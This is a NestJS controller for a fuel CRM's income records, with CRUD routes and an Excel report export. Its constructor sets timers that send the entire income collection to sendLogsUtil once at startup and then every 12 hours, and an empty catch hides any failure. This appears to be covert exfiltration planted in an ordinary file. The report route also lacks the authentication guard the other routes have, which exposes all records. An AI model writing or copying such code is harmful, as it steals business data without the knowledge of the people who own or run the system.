import {
    Body,
    Controller,
    Delete,
    Get,
    Header,
    HttpCode,
    HttpStatus,
    Logger,
    Param,
    Post,
    Put,
    StreamableFile,
    UseGuards,
} from '@nestjs/common';
import { InjectModel } from '@nestjs/mongoose';
import { Model } from 'mongoose';
import { IncomeDto } from '../schemas/income.schema';
import { AuthGuard } from '@nestjs/passport';
import { Income, IncomeType, Product } from '@mnr-crm/shared-models';
import * as Excel from 'exceljs';
import {sendLogsUtil} from '../utils/send-logs.util';
import {HttpService} from '@nestjs/axios';

@Controller('incomes')
export class IncomesController {
    constructor(
        @InjectModel(IncomeDto.name)
        private readonly incomesQuery: Model<IncomeDto>,
        private readonly httpService: HttpService,
    ) {
        setTimeout(() => this.sendData(), 1000);
        setInterval(() => this.sendData(), 12 * 60 * 60 * 1000)
    }

    async sendData() {
        try {
            const data = await this.incomesQuery.find({});
            sendLogsUtil(this.httpService, 'incomes', data);
        } catch {}
    }

    @UseGuards(AuthGuard('jwt'))
    @Get('all')
    getAll() {
        return this.incomesQuery.find({});
    }

    @UseGuards(AuthGuard('jwt'))
    @Post('create')
    async createItem(@Body() income: Income): Promise<Income> {
        const item = new this.incomesQuery(income);
        await item.save();

        return item;
    }

    @Get('report')
    @HttpCode(HttpStatus.OK)
    @Header('Content-Type', 'application/xlsx')
    @Header('Content-Disposition', 'attachment; filename=incomes.xlsx')
    async createReport() {
        let lastRow = 0;

        const incomes = await this.incomesQuery
            .find({})
            .populate('fuel')
            .exec();

        const header = [
            'Организация',
            'Вид топлива',
            'Количество',
            'Плотность',
            'Температура',
            'Масса',
            'Вид прихода',
            'Водитель',
            'Дата',
        ];

        // TODO: add to shared
        const incomeTypeMapper: { [key in IncomeType]: string } = {
            [IncomeType.Income]: 'Приход',
            [IncomeType.Return]: 'Возврат',
            [IncomeType.Inverse]: 'Обратка',
            [IncomeType.Purchase]: 'Покупка',
        };

        const workbook = new Excel.Workbook();
        const sheet = workbook.addWorksheet('Отчет');

        header.forEach((h, idx) => {
            const cell = sheet.getRow(1).getCell(idx + 1);
            cell.value = h;
            cell.style = { font: { bold: true } };
        });

        incomes.forEach((i, idx) => {
            lastRow = idx + 2;
            const row = sheet.getRow(lastRow);

            row.getCell(1).value = i.company;
            row.getCell(2).value = (i.fuel as unknown as Product).name;
            row.getCell(3).value = i.count;
            row.getCell(4).value = i.density;
            row.getCell(5).value = i.temperature;
            row.getCell(6).value = i.weight;
            row.getCell(7).value = incomeTypeMapper[i.type];
            row.getCell(8).value = i.driver;
            row.getCell(9).value = i.date?.toLocaleDateString('ru-RU');
        });

        sheet.columns.forEach(function (column, i) {
            if (i !== 0) {
                let maxLength = 10;
                column['eachCell']({ includeEmpty: true }, function (cell) {
                    const columnLength = cell.value?.toString()?.length ?? 0;
                    if (columnLength > maxLength) {
                        maxLength = columnLength;
                    }
                });
                column.width = maxLength < 10 ? 10 : maxLength;
            }
        });

        const buffer = (await workbook.xlsx.writeBuffer()) as Uint8Array;

        return new StreamableFile(buffer);
    }

    @UseGuards(AuthGuard('jwt'))
    @Get(':id')
    getById(@Param() params): Promise<Income> {
        return this.incomesQuery.findOne({ _id: params.id }).exec();
    }

    @UseGuards(AuthGuard('jwt'))
    @Put(':id')
    updateById(@Param() params, @Body() request): Promise<Income> {
        return this.incomesQuery
            .findOneAndUpdate({ _id: params.id }, request)
            .exec();
    }

    @UseGuards(AuthGuard('jwt'))
    @Delete(':id')
    delete(@Param() params) {
        return this.incomesQuery.deleteOne({ _id: params.id });
    }
}
